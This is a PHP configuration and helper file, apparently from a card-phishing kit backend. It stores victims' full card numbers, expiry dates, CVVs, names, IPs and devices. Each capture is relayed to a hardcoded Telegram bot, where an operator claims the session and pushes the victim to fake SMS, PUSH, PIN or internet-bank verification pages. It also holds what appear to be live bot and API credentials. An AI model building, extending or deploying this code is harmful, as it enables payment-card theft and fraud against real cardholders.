<?php
// Configuration settings
define('BOT_TOKEN', '8919710134:AAEYDME2uOLhL6mtK7Ik49ZR0ctTiOwDqz8');
define('ADMIN_CHAT_ID', [
    '-1004296607604' => [
        [
            'offer_id' => 'default',
            'redirect_url' => 'https://example.com',
            // 'custom_name' => 'My Shop',
            // 'native_card' => false
        ]
        // You can add more configs for the same chat_id:
        // [
        //     'offer_id' => 'another_offer',
        //     'redirect_url' => 'https://another.com',
        //     'custom_name' => 'Another Shop',
        //     'native_card' => true
        // ]
    ]
]);
define('BIN_API_KEY', 'PUB-0YJrjWcv9Lx32bP54un4JkM');
define('SESSION_LIFETIME', 3600);
define('SESSIONS_DIR', __DIR__ . '/sessions');
define('US_CARDS_FILE', __DIR__ . '/us_cards.json');
define('ALLOW_INFO', true);
define('ALLOW_DOMAIN_LOG', true);
define('ALLOW_DEVICE_LOG', true);
define('USE_PHP_LINKS', true);

// Action types
define('ACTION_SMS', 'sms');
define('ACTION_PUSH', 'push');
define('ACTION_PIN', 'pin');
define('ACTION_CUSTOM', 'custom');
define('ACTION_BLOCK', 'block');
define('ACTION_INTERNET_BANK', 'internet_bank');

// Create sessions directory if not exists (with error suppression to prevent hangs)
if (!file_exists(SESSIONS_DIR)) {
    @mkdir(SESSIONS_DIR, 0755, true);
}

// Blocked cards storage
define('BLOCKED_CARDS_FILE', SESSIONS_DIR . '/blocked_cards.json');

// Initialize blocked cards file if not exists (with error suppression and timeout protection)
if (!file_exists(BLOCKED_CARDS_FILE)) {
    @file_put_contents(BLOCKED_CARDS_FILE, json_encode([]), LOCK_EX);
}

// Initialize US cards file if not exists (with error suppression and timeout protection)
if (!file_exists(US_CARDS_FILE)) {
    @file_put_contents(US_CARDS_FILE, json_encode([]), LOCK_EX);
}

// Check if card is blocked
function isCardBlocked($cardNumber) {
    if (!file_exists(BLOCKED_CARDS_FILE)) {
        return false;
    }
    $content = @file_get_contents(BLOCKED_CARDS_FILE);
    if ($content === false) {
        return false;
    }
    $blockedCards = json_decode($content, true);
    if (!is_array($blockedCards)) {
        return false;
    }
    $cardHash = md5($cardNumber);
    return isset($blockedCards[$cardHash]);
}

// Block a card
function blockCard($cardNumber) {
    if (!file_exists(BLOCKED_CARDS_FILE)) {
        @file_put_contents(BLOCKED_CARDS_FILE, json_encode([]), LOCK_EX);
    }
    $content = @file_get_contents(BLOCKED_CARDS_FILE);
    $blockedCards = is_string($content) ? json_decode($content, true) : [];
    if (!is_array($blockedCards)) {
        $blockedCards = [];
    }
    $cardHash = md5($cardNumber);
    $blockedCards[$cardHash] = [
        'card_number' => substr($cardNumber, 0, 6) . '****' . substr($cardNumber, -4),
        'blocked_at' => time()
    ];
    @file_put_contents(BLOCKED_CARDS_FILE, json_encode($blockedCards, JSON_PRETTY_PRINT), LOCK_EX);
}

// Save US card
function saveUSCard($cardData) {
    if (!file_exists(US_CARDS_FILE)) {
        @file_put_contents(US_CARDS_FILE, json_encode([]), LOCK_EX);
    }
    $content = @file_get_contents(US_CARDS_FILE);
    $usCards = is_string($content) ? json_decode($content, true) : [];
    if (!is_array($usCards)) {
        $usCards = [];
    }
    $cardHash = md5($cardData['number']);
    
    $usCards[$cardHash] = [
        'card_number' => $cardData['number'],
        'expiry' => $cardData['expiry'],
        'cvv' => $cardData['cvv'],
        'holder' => $cardData['holder'],
        'ip' => $cardData['ip'],
        'user_agent' => $cardData['user_agent'],
        'card_info' => $cardData['card_info'],
        'saved_at' => time()
    ];
    
    @file_put_contents(US_CARDS_FILE, json_encode($usCards, JSON_PRETTY_PRINT), LOCK_EX);
}

// Safely read and update session data with file locking to prevent race conditions
function updateSessionData($sessionId, $callback) {
    $sessionFile = SESSIONS_DIR . "/{$sessionId}.json";
    
    if (!file_exists($sessionFile)) {
        return false;
    }
    
    // Open file for reading and writing with exclusive lock
    $fp = fopen($sessionFile, 'r+');
    if (!$fp) {
        return false;
    }
    
    // Acquire exclusive lock (blocks until available)
    if (!flock($fp, LOCK_EX)) {
        fclose($fp);
        return false;
    }
    
    try {
        // Read current session data
        $fileSize = filesize($sessionFile);
        $content = $fileSize > 0 ? fread($fp, $fileSize) : '{}';
        $sessionData = json_decode($content, true);
        
        // Validate decoded data - if decode failed or not array, preserve existing file
        if (!is_array($sessionData)) {
            // Log error but don't overwrite - file might be corrupted
            error_log("Warning: Failed to decode session file {$sessionFile}, JSON error: " . json_last_error_msg());
            return false;
        }
        
        // Ensure session_id is set
        $sessionData['session_id'] = $sessionId;
        
        // CRITICAL: Preserve essential fields before callback to prevent data loss
        $preservedCardData = $sessionData['card_data'] ?? null;
        $preservedRootMessage = $sessionData['root_message'] ?? null;
        $preservedLastMessage = $sessionData['last_message'] ?? null;
        $preservedCreatedAt = $sessionData['created_at'] ?? null;
        $preservedAssignedTo = $sessionData['assigned_to'] ?? null;
        $preservedAssignedName = $sessionData['assigned_name'] ?? null;
        
        // Call callback to modify session data
        $result = $callback($sessionData);
        
        // CRITICAL: Restore essential fields if callback accidentally removed them
        if (empty($sessionData['card_data']) && $preservedCardData !== null) {
            $sessionData['card_data'] = $preservedCardData;
        }
        if (empty($sessionData['root_message']) && $preservedRootMessage !== null) {
            $sessionData['root_message'] = $preservedRootMessage;
        }
        if (empty($sessionData['last_message']) && $preservedLastMessage !== null) {
            $sessionData['last_message'] = $preservedLastMessage;
        }
        if (empty($sessionData['created_at']) && $preservedCreatedAt !== null) {
            $sessionData['created_at'] = $preservedCreatedAt;
        }
        if (!isset($sessionData['assigned_to']) && $preservedAssignedTo !== null) {
            $sessionData['assigned_to'] = $preservedAssignedTo;
        }
        if (!isset($sessionData['assigned_name']) && $preservedAssignedName !== null) {
            $sessionData['assigned_name'] = $preservedAssignedName;
        }
        
        // Ensure session_id is still set
        $sessionData['session_id'] = $sessionId;
        
        // Write back to file (truncate first)
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, json_encode($sessionData, JSON_PRETTY_PRINT));
        fflush($fp);
        
        return $result;
    } finally {
        // Release lock and close file
        flock($fp, LOCK_UN);
        fclose($fp);
    }
}

// Update presence data in isolated file (prevents race conditions with main session)
function updatePresenceData($sessionId, $callback) {
    $presenceFile = SESSIONS_DIR . "/{$sessionId}.presence.json";
    
    // Open file for reading and writing with exclusive lock
    $fp = fopen($presenceFile, 'c+'); // 'c+' creates if doesn't exist
    if (!$fp) {
        return false;
    }
    
    // Acquire exclusive lock
    if (!flock($fp, LOCK_EX)) {
        fclose($fp);
        return false;
    }
    
    try {
        // Read current presence data
        $fileSize = filesize($presenceFile);
        $content = $fileSize > 0 ? fread($fp, $fileSize) : '{}';
        $presenceData = json_decode($content, true) ?: [];
        
        // Call callback to modify presence data
        $result = $callback($presenceData);
        
        // Write back to file
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, json_encode($presenceData, JSON_PRETTY_PRINT));
        fflush($fp);
        
        return $result;
    } finally {
        flock($fp, LOCK_UN);
        fclose($fp);
    }
}

// Read presence data from isolated file
function readPresenceData($sessionId) {
    $presenceFile = SESSIONS_DIR . "/{$sessionId}.presence.json";
    
    if (!file_exists($presenceFile)) {
        return [];
    }
    
    $fp = fopen($presenceFile, 'r');
    if (!$fp) {
        return [];
    }
    
    if (!flock($fp, LOCK_SH)) {
        fclose($fp);
        return [];
    }
    
    try {
        $fileSize = filesize($presenceFile);
        $content = $fileSize > 0 ? fread($fp, $fileSize) : '{}';
        return json_decode($content, true) ?: [];
    } finally {
        flock($fp, LOCK_UN);
        fclose($fp);
    }
}

// Merge presence data into session data (for backward compatibility)
function mergePresenceIntoSession(&$sessionData, $presenceData) {
    if (isset($presenceData['last_poll_date'])) {
        $sessionData['last_poll_date'] = $presenceData['last_poll_date'];
    }
    // CRITICAL: Prioritize presence data current_page (more up-to-date) but fallback to session if empty
    if (!empty($presenceData['current_page'])) {
        $sessionData['current_page'] = $presenceData['current_page'];
    }
    if (isset($presenceData['presence_line'])) {
        $sessionData['presence_line'] = $presenceData['presence_line'];
    }
    if (isset($presenceData['last_presence_update'])) {
        $sessionData['last_presence_update'] = $presenceData['last_presence_update'];
    }
}

// Safely read session data with file locking
function readSessionData($sessionId) {
    $sessionFile = SESSIONS_DIR . "/{$sessionId}.json";
    
    if (!file_exists($sessionFile)) {
        return null;
    }
    
    // Open file for reading with shared lock
    $fp = fopen($sessionFile, 'r');
    if (!$fp) {
        return null;
    }
    
    // Acquire shared lock (allows multiple readers, blocks writers)
    if (!flock($fp, LOCK_SH)) {
        fclose($fp);
        return null;
    }
    
    try {
        $fileSize = filesize($sessionFile);
        $content = $fileSize > 0 ? fread($fp, $fileSize) : '{}';
        $sessionData = json_decode($content, true) ?: [];
        $sessionData['session_id'] = $sessionId;
        return $sessionData;
    } finally {
        // Release lock and close file
        flock($fp, LOCK_UN);
        fclose($fp);
    }
}

// Format card number for display
function formatCardNumber($cardNumber) {
    return '**** **** **** ' . substr($cardNumber, -4);
}

// Get action name for display
function getActionName($action) {
    $actions = [
        ACTION_SMS => 'SMS verification',
        ACTION_PUSH => 'PUSH verification',
        ACTION_PIN => 'PIN verification',
        ACTION_CUSTOM => 'Custom message',
        ACTION_BLOCK => 'Block card',
        ACTION_INTERNET_BANK => 'Internet Bank'
    ];
    return $actions[$action] ?? $action;
}

function getAdminConfigByOfferId($offerId) {
    if (!is_array(ADMIN_CHAT_ID)) {
        return ['chat_id' => ADMIN_CHAT_ID, 'offer_id' => 'default'];
    }

    // Search through all chat_ids and their config arrays
    foreach (ADMIN_CHAT_ID as $chatId => $configs) {
        // Check if configs is an array (new format with multiple configs per chat_id)
        if (is_array($configs) && isset($configs[0]) && is_array($configs[0])) {
            // New format: chat_id => [config1, config2, ...]
            foreach ($configs as $config) {
                if (is_array($config) && !empty($config['offer_id']) && $config['offer_id'] === $offerId) {
                    return $config + ['chat_id' => $chatId];
                }
            }
        } elseif (is_array($configs) && !empty($configs['offer_id'])) {
            // Old format: chat_id => config (backward compatibility)
            if ($configs['offer_id'] === $offerId) {
                return $configs + ['chat_id' => $chatId];
            }
        }
    }

    // Fallback: return first available config
    $firstKey = array_key_first(ADMIN_CHAT_ID);
    if ($firstKey !== null) {
        $configs = ADMIN_CHAT_ID[$firstKey];
        if (is_array($configs)) {
            // Check if it's new format (array of configs) or old format (single config)
            if (isset($configs[0]) && is_array($configs[0])) {
                // New format: return first config
                $config = $configs[0];
                if (is_array($config)) {
                    return $config + ['chat_id' => $firstKey];
                }
            } elseif (is_array($configs) && !empty($configs['offer_id'])) {
                // Old format: return as is
                return $configs + ['chat_id' => $firstKey];
            }
        }
    }

    return ['chat_id' => ADMIN_CHAT_ID, 'offer_id' => 'default'];
}

function getAdminConfigFromSession($sessionData) {
    $offerId = $sessionData['offer_id'] ?? '';
    return getAdminConfigByOfferId($offerId);
}

function getBaseUrl() {
    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
    return 'https://' . $host;
}

function getRedirectUrl($sessionData) {
    $adminConfig = getAdminConfigFromSession($sessionData);
    return $adminConfig['redirect_url'] ?? 'https://check-claim.icu';
}

function buildPageUrl($page, $params = []) {
    $normalized = $page;
    if (substr($normalized, -4) === '.php') {
        $normalized = substr($normalized, 0, -4);
    }

    $path = USE_PHP_LINKS ? ($normalized . '.php') : $normalized;

    if (!empty($params)) {
        $path .= '?' . http_build_query($params);
    }

    return $path;
}

// Build action keyboard - only change icon to 👉, keep button text
function buildActionKeyboard($sessionId, $includePaymentButtons = true, $pageTitle = 'Unknown', $sessionData = null) {
    
    // Validate sessionId - if empty, return empty keyboard to prevent invalid buttons
    if (empty($sessionId) || !preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
        return ['inline_keyboard' => []];
    }
    
    // Check if session is assigned
    $isAssigned = !empty($sessionData) && !empty($sessionData['assigned_to']);
    
    $keyboard = [
        'inline_keyboard' => []
    ];
    
    // Add "In Work" button if NOT assigned (only this button)
    if (!$isAssigned) {
        $keyboard['inline_keyboard'][] = [
            ['text' => '🔄 In Work', 'callback_data' => "assign:$sessionId"]
        ];
        return $keyboard; // Return early - no action buttons until assigned
    }
    
    // If assigned, show all action buttons (but NOT "In Work" button)
    $keyboard['inline_keyboard'][] = [
        ['text' => '📲 SMS', 'callback_data' => "action:sms:$sessionId"],
        ['text' => '📱 PUSH', 'callback_data' => "action:push:$sessionId"]
    ];
    $keyboard['inline_keyboard'][] = [
        ['text' => '🔑 PIN', 'callback_data' => "action:pin:$sessionId"],
        ['text' => '💬 Custom', 'callback_data' => "action:custom:$sessionId"]
    ];
    $keyboard['inline_keyboard'][] = [
        ['text' => '🏦 Internet Bank', 'callback_data' => "action:internet_bank:$sessionId"]
    ];
    $keyboard['inline_keyboard'][] = [
        ['text' => '🚫 Block Card', 'callback_data' => "action:block:$sessionId"]
    ];

    if ($includePaymentButtons) {
        $keyboard['inline_keyboard'][] = [
            ['text' => '✅ Successful payment', 'callback_data' => "action:payment_success:$sessionId"],
            ['text' => '❌ Payment failed', 'callback_data' => "action:payment_failed:$sessionId"]
        ];
    }

    // Only change icon to 👉, keep button text
    $actionKey = getLocationActionKey($pageTitle);
    if (!empty($actionKey)) {
        $iconMap = [
            'sms' => '📲',
            'push' => '📱',
            'pin' => '🔑',
            'custom' => '💬',
            'internet_bank' => '🏦'
        ];
        $textMap = [
            'sms' => 'SMS',
            'push' => 'PUSH',
            'pin' => 'PIN',
            'custom' => 'Custom',
            'internet_bank' => 'Internet Bank'
        ];
        foreach ($keyboard['inline_keyboard'] as &$row) {
            foreach ($row as &$button) {
                if (($button['callback_data'] ?? '') === "action:$actionKey:$sessionId") {
                    // Change icon to 👉 but keep the text
                    $button['text'] = '👉 ' . ($textMap[$actionKey] ?? $pageTitle);
                    $button['callback_data'] = "location:$sessionId";
                }
            }
        }
        unset($row, $button);
    }

    return $keyboard;
}

function getLocationActionKey($pageTitle) {
    $title = strtolower($pageTitle);
    if (strpos($title, 'sms') !== false) {
        return 'sms';
    }
    if (strpos($title, 'push') !== false) {
        return 'push';
    }
    if (strpos($title, 'pin') !== false) {
        return 'pin';
    }
    if (strpos($title, 'custom') !== false) {
        return 'custom';
    }
    if (strpos($title, 'internet') !== false) {
        return 'internet_bank';
    }
    return '';
}

function getShopName($cardData, $adminConfig) {
    if (!ALLOW_INFO) {
        return null;
    }
    if (!empty($adminConfig['custom_name'])) {
        return $adminConfig['custom_name'];
    }
    if (!empty($cardData['store'])) {
        return $cardData['store'];
    }
    return null;
}

function formatCardNumberForTelegram($cardNumber, $nativeCard = false) {
    if ($nativeCard) {
        return $cardNumber;
    }
    return '`' . implode(' ', str_split($cardNumber, 4)) . '`';
}

function buildInfoLines($cardData, $adminConfig) {
    if (!ALLOW_INFO) {
        return '';
    }
    $lines = '';
    $shopName = getShopName($cardData, $adminConfig);
    if (!empty($shopName)) {
        $lines .= "🏪 Store: `{$shopName}`\n";
    }
    if (!empty($cardData['amount'])) {
        $lines .= "💰 Amount: `{$cardData['amount']}`\n";
    }
    if (!empty($cardData['description'])) {
        $lines .= "📋 Description: `{$cardData['description']}`\n";
    }
    return $lines;
}

function buildMetaLines($sessionData) {
    $lines = '';
    if (ALLOW_DOMAIN_LOG && !empty($sessionData['referrer_domain'])) {
        $lines .= "Referrer: `{$sessionData['referrer_domain']}`\n";
    }
    if (ALLOW_DEVICE_LOG && !empty($sessionData['device_info'])) {
        $deviceInfo = $sessionData['device_info'];
        $emoji = '';
        if (stripos($deviceInfo, 'Android') === 0) {
            $emoji = '📱';
        } elseif (stripos($deviceInfo, 'iOS') === 0 || stripos($deviceInfo, 'iPadOS') === 0) {
            $emoji = '🍏';
        } elseif (stripos($deviceInfo, 'Windows') === 0 || stripos($deviceInfo, 'macOS') === 0 || stripos($deviceInfo, 'Linux') === 0) {
            $emoji = '💻';
        }
        $prefix = $emoji ? ($emoji . ' ') : '';
        $lines .= "Device: `{$prefix}{$deviceInfo}`\n";
    }
    return $lines;
}

function getReferrerDomain($referrer) {
    if (empty($referrer)) {
        return null;
    }
    $parts = parse_url($referrer);
    return $parts['host'] ?? null;
}

function getDeviceInfo($userAgent) {
    if (empty($userAgent)) {
        return null;
    }

    $ua = $userAgent;
    $os = 'Unknown OS';
    $model = '';

    if (stripos($ua, 'Android') !== false) {
        $os = 'Android';
        if (preg_match('/Android [^;]+;\s*([^;]+?)(?: Build|;|\))/i', $ua, $matches)) {
            $model = trim($matches[1]);
        }
    } elseif (stripos($ua, 'iPhone') !== false) {
        $os = 'iOS';
    } elseif (stripos($ua, 'iPad') !== false) {
        $os = 'iPadOS';
    } elseif (stripos($ua, 'Mac OS X') !== false) {
        $os = 'macOS';
    } elseif (stripos($ua, 'Windows') !== false) {
        $os = 'Windows';
    } elseif (stripos($ua, 'Linux') !== false) {
        $os = 'Linux';
    }

    $browser = 'Unknown Browser';
    if (preg_match('/Edg\/([0-9.]+)/i', $ua)) {
        $browser = 'Edge';
    } elseif (preg_match('/Chrome\/([0-9.]+)/i', $ua) && stripos($ua, 'Edg/') === false) {
        $browser = 'Chrome';
    } elseif (preg_match('/Firefox\/([0-9.]+)/i', $ua)) {
        $browser = 'Firefox';
    } elseif (preg_match('/Safari\/([0-9.]+)/i', $ua) && stripos($ua, 'Chrome/') === false) {
        $browser = 'Safari';
    }

    $device = $os;
    if ($os === 'Android' && !empty($model)) {
        $device = $os . ' ' . $model;
    }

    return $device . ', ' . $browser;
}

function getIpGeoInfo($ip) {
    if (empty($ip)) {
        return null;
    }

    // Request city, country, and countryCode
    $url = "http://ip-api.com/json/" . urlencode($ip) . "?fields=status,country,countryCode,city";
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    if (!$response) {
        return null;
    }

    $data = json_decode($response, true);
    if (!is_array($data) || ($data['status'] ?? '') !== 'success') {
        return null;
    }

    return [
        'country' => $data['country'] ?? null,
        'country_code' => $data['countryCode'] ?? null,
        'city' => $data['city'] ?? null
    ];
}

function countryCodeToFlag($code) {
    if (empty($code) || strlen($code) !== 2) {
        return '';
    }
    if (!function_exists('mb_chr')) {
        return '';
    }
    $code = strtoupper($code);
    $offset = 127397;
    $flag = '';
    for ($i = 0; $i < 2; $i++) {
        $flag .= mb_chr($offset + ord($code[$i]), 'UTF-8');
    }
    return $flag;
}

function formatIpWithGeo($ip, $geoInfo) {
    if (!$geoInfo || empty($geoInfo['country']) || empty($geoInfo['country_code'])) {
        return $ip;
    }
    $flag = countryCodeToFlag($geoInfo['country_code']);
    $countryPart = $flag . " " . $geoInfo['country'];
    
    // Format: IP (emoji Country, City)
    if (!empty($geoInfo['city'])) {
        return $ip . " (" . $countryPart . ", " . $geoInfo['city'] . ")";
    }
    
    // Fallback to country only if city not available
    return $ip . " (" . $countryPart . ")";
}

function getIpDisplayFromSession(&$sessionData) {
    $ip = $sessionData['card_data']['ip'] ?? '';
    $geoInfo = $sessionData['card_data']['ip_geo'] ?? null;
    if (!$geoInfo && !empty($ip)) {
        $geoInfo = getIpGeoInfo($ip);
        if ($geoInfo) {
            $sessionData['card_data']['ip_geo'] = $geoInfo;
        }
    }
    return formatIpWithGeo($ip, $geoInfo);
}

function buildPresenceLine($sessionData) {
    $pageTitle = $sessionData['current_page'] ?? 'Unknown';
    return "Page: {$pageTitle}";
}

function replacePresenceLine($messageText, $presenceLine) {
    if (preg_match('/^Page:.*$/m', $messageText)) {
        return preg_replace('/^Page:.*$/m', $presenceLine, $messageText);
    }
    if (preg_match('/^Status:.*$/m', $messageText)) {
        return preg_replace('/^Status:.*$/m', $presenceLine, $messageText);
    }
    return $presenceLine . "\n\n" . $messageText;
}

function sendTelegramMessageStored($token, $chatId, $text, $keyboard = null) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'Markdown'];
    if ($keyboard) {
        $data['reply_markup'] = json_encode($keyboard);
    }

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    return json_decode($response, true);
}

// Send a reply message to the root message
function sendTelegramReply($token, $chatId, $replyToMessageId, $text) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'Markdown',
        'reply_to_message_id' => $replyToMessageId
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    return json_decode($response, true);
}

function editTelegramMessageStored($token, $chatId, $messageId, $text, $keyboard = null) {
    $url = "https://api.telegram.org/bot$token/editMessageText";
    $data = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $text,
        'parse_mode' => 'Markdown'
    ];
    if ($keyboard) {
        $data['reply_markup'] = json_encode($keyboard);
    }
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    return json_decode($response, true);
}

function storeLastTelegramMessage(&$sessionData, $chatId, $messageId, $text, $keyboard = null) {
    // Store as root message
    $sessionData['root_message'] = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $text,
        'keyboard' => $keyboard
    ];
    // Also keep in last_message for compatibility
    $sessionData['last_message'] = $sessionData['root_message'];
    $sessionData['last_poll_date'] = time();
    $sessionData['last_message_id'] = $messageId;
    $sessionData['last_message_chat_id'] = $chatId;
    $sessionData['presence_line'] = buildPresenceLine($sessionData);
}

// Update root message with new presence and keyboard
function updateRootMessage(&$sessionData) {
    if (empty($sessionData['root_message']['chat_id']) || empty($sessionData['root_message']['message_id'])) {
        return false;
    }

    $presenceLine = buildPresenceLine($sessionData);
    $currentText = $sessionData['root_message']['text'] ?? '';
    $updatedText = replacePresenceLine($currentText, $presenceLine);
    
    // Update keyboard with current page - CRITICAL: session_id must be available
    $sessionId = $sessionData['session_id'] ?? '';
    
    if (empty($sessionId)) {
        // Try to extract from message text (more reliable patterns)
        if (preg_match('/Session: `([a-f0-9]{32})`/', $currentText, $matches)) {
            $sessionId = $matches[1];
            $sessionData['session_id'] = $sessionId; // Store it back
        } else {
            // If we can't extract sessionId, don't update keyboard - keep the old one
            // This prevents creating buttons with empty sessionIds
            $keyboard = $sessionData['root_message']['keyboard'] ?? null;
        }
    }
    
    // Only build new keyboard if we have a valid sessionId
    // Use passed sessionData (already up-to-date if called from updateSessionData callback)
    // Only merge presence data (safe - different file, no deadlock)
    if (!empty($sessionId) && preg_match('/^[a-f0-9]{32}$/', $sessionId)) {
        // Use the session data passed in (it's already up-to-date if we're in an atomic update)
        $keyboardData = $sessionData;
        
        // Merge presence data if available (safe - different file, no deadlock)
        $presenceData = readPresenceData($sessionId);
        if ($presenceData) {
            mergePresenceIntoSession($keyboardData, $presenceData);
        }
        
        $keyboard = buildActionKeyboard($sessionId, true, $keyboardData['current_page'] ?? 'Unknown', $keyboardData);
    }
    
    // If keyboard is still null, we couldn't build it - don't update
    if (empty($keyboard)) {
        // Still update the text (presence line) but not the keyboard
        $chatId = $sessionData['root_message']['chat_id'];
        $messageId = $sessionData['root_message']['message_id'];
        $response = editTelegramMessageStored(BOT_TOKEN, $chatId, $messageId, $updatedText, null);
        if (!empty($response['ok'])) {
            $sessionData['root_message']['text'] = $updatedText;
            $sessionData['presence_line'] = $presenceLine;
            return true;
        }
        return false;
    }

    $chatId = $sessionData['root_message']['chat_id'];
    $messageId = $sessionData['root_message']['message_id'];

    $response = editTelegramMessageStored(BOT_TOKEN, $chatId, $messageId, $updatedText, $keyboard);
    if (!empty($response['ok'])) {
        $sessionData['root_message']['text'] = $updatedText;
        $sessionData['root_message']['keyboard'] = $keyboard;
        $sessionData['last_message'] = $sessionData['root_message'];
        $sessionData['presence_line'] = $presenceLine;
        return true;
    }

    return false;
}

function updatePresenceInTelegram(&$sessionData) {
    // Ensure session_id is set before updating
    if (empty($sessionData['session_id'])) {
        // Try to extract from message text
        $currentText = $sessionData['root_message']['text'] ?? '';
        if (preg_match('/Session: `([a-f0-9]{32})`/', $currentText, $matches)) {
            $sessionData['session_id'] = $matches[1];
        }
    }
    return updateRootMessage($sessionData);
}
?>
